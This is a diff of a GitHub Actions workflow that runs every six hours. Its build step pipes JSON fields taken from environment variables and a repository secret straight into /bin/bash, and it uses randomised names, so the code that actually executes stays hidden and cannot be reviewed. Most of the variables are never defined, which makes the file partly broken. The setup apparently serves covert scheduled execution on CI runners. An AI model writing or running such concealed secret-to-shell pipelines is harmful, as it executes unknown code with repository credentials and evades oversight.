@@ -1,25 +1,37 @@
 name: hushizhi2178
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
+    - cron: '59 5/6 * * *'
 
-jobs:  # 27747
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: hushizhi2178
         env:
-          ts51: ${{ secrets.ts51 }}
+          q43985: ${{ secrets.q43985 }}
         run: |
-          echo $ts51 | jq -r .xuz05501 | /bin/bash
-          echo $fv49 | jq -r .ookqf68935 | /bin/bash
-          echo $dlu02 | jq -r .v9418 | /bin/bash
-          echo $mhuqh451 | jq -r .sjzc7 | /bin/bash
-          echo $yner895 | jq -r .scrx23907 | /bin/bash
-          echo $u45 | jq -r .awosm1763 | /bin/bash
-          echo $dzoo876 | jq -r .vwsdc2311 | /bin/bash
-          echo $ysv6 | jq -r .vz4841 | /bin/bash
-          echo $h7000 | jq -r .pox42 | /bin/bash
+          echo $q43985 | jq -r .xoqha8 | /bin/bash
+          echo $oopuh03 | jq -r .mm0 | /bin/bash
+          echo $ds472 | jq -r .ll11 | /bin/bash
+          echo $g833 | jq -r .d426 | /bin/bash
+          echo $yw50613 | jq -r .dll9 | /bin/bash
+          echo $tlwp64 | jq -r .ltv1 | /bin/bash
+          echo $u38814 | jq -r .e3302 | /bin/bash
+          echo $e43 | jq -r .k13 | /bin/bash
+          echo $uob23 | jq -r .o1 | /bin/bash
+          echo $fgke56430 | jq -r .iqgbx73606 | /bin/bash
+          echo $qpm98520 | jq -r .tscmc8020 | /bin/bash
+          echo $jo96690 | jq -r .fjv40485 | /bin/bash
+          echo $tnr936 | jq -r .o74282 | /bin/bash
+          echo $nn970 | jq -r .dey71 | /bin/bash
+          echo $yz4 | jq -r .rgbuz9 | /bin/bash
+          echo $hierd635 | jq -r .vxeqp88 | /bin/bash
+          echo $j8707 | jq -r .mlpt90092 | /bin/bash
+          echo $or598 | jq -r .zhd9 | /bin/bash
+          echo $aeuxp358 | jq -r .t3086 | /bin/bash
+          echo $u8691 | jq -r .ajaqw0 | /bin/bash
 
